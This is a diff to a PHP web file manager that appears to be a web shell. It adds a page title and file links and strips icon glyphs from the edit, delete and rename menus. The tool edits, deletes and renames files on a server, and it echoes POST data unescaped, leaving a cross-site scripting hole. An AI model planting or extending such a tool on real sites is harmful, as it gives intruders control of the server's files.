@@ -1,3 +1,5 @@
+<title><?= get_current_user() ?></title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
 	body {
@@ -447,10 +449,10 @@ switch (@$_POST['action']) {
 			<form method="post">
 				<td class="no-border" colspan="3">
 					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-						<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
-						<option value="edit"selected><span>&#9997;</span>&nbsp; EDIT</option>
-						<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
-						<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+						<option value="back">BACK</option>
+						<option value="edit"selected>EDIT</option>
+						<option value="delete">DELETE</option>
+						<option value="rename">RENAME</option>
 					</select>
 					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
 					<input type="hidden" name="file" value="<?=$_POST['file']?>">
@@ -527,8 +529,8 @@ foreach ($iterator as $dir) {
 				<td>
 					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 						<option selected>CHOOSE . .</option>
-						<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
-						<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+						<option value="delete">DELETE</option>
+						<option value="rename">RENAME</option>
 					</select>
 					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
 					<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -549,7 +551,9 @@ foreach ($iterator as $files) {
 				<?= $file->img($files->getPathname()) ?>
 			</td>
 			<td>
-				<button><?=basename($files->getPathname())?></button>
+				<a href="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
+					<button><?=basename($files->getPathname())?></button>
+				</a>
 			</td>
 			<td>
 				<center>
@@ -575,8 +579,8 @@ foreach ($iterator as $files) {
 							?>
 							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 								<option selected>CHOOSE . .</option>
-								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
-								<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+								<option value="delete">DELETE</option>
+								<option value="rename">RENAME</option>
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -587,9 +591,9 @@ foreach ($iterator as $files) {
 							?>
 							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 								<option selected>CHOOSE . .</option>
-								<option value="edit"><span>&#9997;</span>&nbsp; EDIT</option>
-								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
-								<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+								<option value="edit">EDIT</option>
+								<option value="delete">DELETE</option>
+								<option value="rename">RENAME</option>
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
